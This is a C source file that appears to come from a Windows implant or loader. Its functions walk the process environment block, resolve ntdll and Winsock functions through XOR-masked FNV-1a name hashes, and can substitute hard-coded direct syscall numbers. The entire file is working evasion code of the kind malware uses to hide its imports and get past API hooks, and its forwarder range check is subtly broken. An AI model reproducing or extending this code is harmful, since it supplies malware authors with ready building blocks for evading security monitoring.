#include <ldr.h>
#include <config.h>
#include <fnv1a.h>
#include "ntapi\ntapi.h"
#include "wsapi\wsapi.h"

HMODULE
DECLSPEC_NOINLINE
LdrGetModule(
    IN DWORD dwModuleNameHash
    )
{
    PPEB Peb = RtlpGetPeb();
    PLDR_DATA_TABLE_ENTRY Index = (PVOID)((PPEB_LDR_DATA)Peb->Ldr)->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY End = Index;

    do {
        if (Index->BaseDllName.Length) {
            if (Fnv1AHashStringW(Index->BaseDllName.Buffer) == dwModuleNameHash) {
                return (HMODULE)Index->DllBase;
            }
        }

        Index = (PVOID)Index->InLoadOrderLinks.Flink;
    } while (Index != End);

    return NULL;
}

ULONG
DECLSPEC_NOINLINE
LdrGetProcAddressEx(
    IN  HMODULE hModule,
    IN  ULONG   dwProcCount,
    IN  PDWORD  dwNameSumsList,
    OUT PVOID   ProcessList
    )
{
    PIMAGE_OPTIONAL_HEADER  OptionalHeader  = (PIMAGE_OPTIONAL_HEADER )((ULONG_PTR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew + sizeof(ULONG) + IMAGE_SIZEOF_FILE_HEADER);
    PIMAGE_DATA_DIRECTORY   DataDirectory   = (PIMAGE_DATA_DIRECTORY  )(&OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hModule + DataDirectory->VirtualAddress);

    ULONG     dwProcFound  = 0;
    ULONG_PTR dwExportBase = (ULONG_PTR)ExportDirectory;
    ULONG_PTR dwExportEnd  = (ULONG_PTR)ExportDirectory + DataDirectory->Size;
    PULONG    dwFunctions  = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfFunctions);
    PULONG    dwNames      = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfNames);
    PUSHORT   nOrdinals    = (PUSHORT)((ULONG_PTR)hModule + ExportDirectory->AddressOfNameOrdinals);

    for (ULONG i = 0; i != ExportDirectory->NumberOfNames && dwProcFound != dwProcCount; i++) {
        ULONG_PTR dwFunctionAddress = (ULONG_PTR)hModule + dwFunctions[nOrdinals[i]];

        if (dwFunctionAddress < dwExportBase && dwFunctionAddress > dwExportEnd) {
            continue;
        }

        DWORD dwFunctionSum = Fnv1AHashStringA((PSTR)((ULONG_PTR)hModule + dwNames[i]));

        for (ULONG y = 0; y != dwProcCount; y++) {
            if (dwFunctionSum == dwNameSumsList[y]) {
                #if SCFG_CORE_LDR_PRINT_FOUND_PROC == ON
                    $DLOG1(DLG_FLT_DEFAULT, "%p %08lX %s", dwFunctionAddress, dwFunctionSum, (PSTR)((ULONG_PTR)hModule + dwNames[i]));
                #endif

                ((PULONG_PTR)ProcessList)[y] = dwFunctionAddress;
                dwProcFound++;
        
                break;
            }
        }
    }

    return dwProcFound;
}

enum {
    HASH_NTDLL_KEY    = RTLP_LCG_DWORD,
    HASH_NTDLLALT_KEY = RTLP_LCG_DWORD,
};

static CONST VOLATILE DWORD NtdllNameSum    = 0xA62A3B3B ^ HASH_NTDLL_KEY;    // ntdll.dll
static CONST VOLATILE DWORD NtdllNameSumAlt = 0x145370BB ^ HASH_NTDLLALT_KEY; // NTDLL.DLL

BOOL
LdrLoadNtapi(VOID)
{
    $DLOG1(DLG_FLT_INFO, "Loading NTAPI");

#if SCFG_CORE_NTAPI_INIT_USE_SYSCALLS == ON
    if (FALSE) {
#elif SCFG_CORE_NTAPI_INIT_USE_PROCLOAD == ON
    if (TRUE) {
#else
    if (Config.NtVersion.bIsDeprecated) {
#endif
        HMODULE hModule;

        if (IS_NULL(hModule = LdrGetModule(NtdllNameSum ^ HASH_NTDLL_KEY))) {
            /* For future versions, you never know */
            if (IS_NULL(hModule = LdrGetModule(NtdllNameSumAlt ^ HASH_NTDLLALT_KEY))) {
                $DLOG1(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");

                return FALSE;
            }
        }

        $DLOG3(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);

        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            NtapiSyscallsNamesHash[i] ^= NtapiSyscallsNamesHashXorKey;
        }

        ULONG dwFunctionsImported = LdrGetProcAddressEx(
            hModule,
            NtapiSyscallsFunctionsCount,
            NtapiSyscallsNamesHash,
            NtapiSyscallsAddressStorage
            );

        if (dwFunctionsImported != NtapiSyscallsFunctionsCount) {
            $DLOG1(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, NtapiSyscallsFunctionsCount);

            return FALSE;
        }
    } else {
        PULONG32_PTR dwSyscallOffset = (PULONG32_PTR)(Config.Cpu.bUnderWow64 ? &NtapiSyscallsOffsetWow64 : &NtapiSyscallsOffsetX86) + (Config.NtVersion.dwCommonIndex * NtapiSyscallsFunctionsCount);

        PRAGMA_LOOP_UNROLL_N(16)
        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            #if SCFG_CORE_LDR_PRINT_SYSCALLS == ON
                $DLOG1(DLG_FLT_DEFAULT, "0x%p = % 5lX", &NtapiSyscallsAddressStorage[i], (PVOID)dwSyscallOffset[i]);
            #endif

            NtapiSyscallsAddressStorage[i] = (PVOID)dwSyscallOffset[i];
        }
    }

    $DLOG2(DLG_FLT_INFO, "Done");

    return TRUE;
}

enum {
    HASH_WS2_32_KEY = RTLP_LCG_DWORD,
};

static CONST VOLATILE DWORD Ws2_32NameSum = 0xA10780C3 ^ HASH_WS2_32_KEY; // WS2_32.dll

BOOL
LdrLoadWsapi(VOID)
{
    $DLOG1(DLG_FLT_INFO, "Loading WSAPI");

    HMODULE hModule;

    if (IS_NULL(hModule = LdrGetModule(Ws2_32NameSum ^ HASH_WS2_32_KEY))) {
        $DLOG1(DLG_FLT_ERROR, "Failed to find ws2_32.dll");

        return FALSE;
    }

    for (ULONG_PTR i = 0; i != WsapiFunctionsCount; i++) {
        WsapiNamesHash[i] ^= WsapiNamesHashXorKey;
    }

    ULONG dwFunctionsImported = LdrGetProcAddressEx(
        hModule,
        WsapiFunctionsCount,
        WsapiNamesHash,
        WsapiAddressStorage
        );

    if (dwFunctionsImported != WsapiFunctionsCount) {
        $DLOG1(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, WsapiFunctionsCount);

        return FALSE;
    }

    $DLOG2(DLG_FLT_INFO, "Done");

    return TRUE;
}
